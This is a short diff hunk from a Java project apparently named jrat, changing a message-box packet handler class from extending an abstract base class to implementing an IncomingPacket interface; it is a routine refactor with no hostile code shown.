@@ -6,7 +6,7 @@ import jrat.common.Constants;
 import javax.swing.*;
 
 
-public class Packet10Messagebox extends AbstractIncomingPacket {
+public class Packet10Messagebox implements IncomingPacket {
 
 	@Override
 	public void read(final Connection con) throws Exception {
